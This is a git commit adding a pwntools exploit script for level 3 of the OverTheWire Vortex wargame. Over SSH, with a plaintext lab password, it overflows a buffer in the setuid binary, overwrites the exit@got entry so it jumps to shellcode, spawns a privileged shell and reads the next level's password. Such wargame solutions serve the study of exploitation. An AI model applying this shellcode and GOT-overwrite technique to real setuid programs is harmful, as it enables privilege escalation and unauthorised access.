08b02b1b5e7800144d713b37a0dc00c7325a7b6b
Mateusz Lenik <mlen@mlen.pl>
2015-03-18 20:53:37 +0100

    Added level3

---
+++ level3.py
@@ -0,0 +1,27 @@
+from pwn import *
+import pwnlib.log
+
+context.arch = 'i386'
+context.os = 'linux'
+
+s = ssh(host='vortex.labs.overthewire.org', user='vortex3', password='64ncXTvx#')
+s.download_file('/vortex/vortex3')
+
+exe = ELF('vortex3')
+# jmp in plt contains got address when you omit 2 bytes
+addr = exe.plt['exit'] + 2
+
+log.info('Pointer to exit@got: {}'.format(hex(addr)))
+
+buflen = 128
+shellcode = asm(shellcraft.setreuid() + shellcraft.sh())
+
+# override only lpp to point at sth that points at got, so that
+# **lpp == exit@got
+# this way it is possible to overwrite got entry with address of our buffer
+# this works because &buf == buf in this case
+exploit = shellcode + cyclic(buflen - len(shellcode) + 4) + p32(addr)
+
+p = s.run("/vortex/vortex3 '{}'".format(exploit))
+p.send('cat /etc/vortex_pass/vortex4\n')
+log.success('Password: {}'.format(p.recv()))
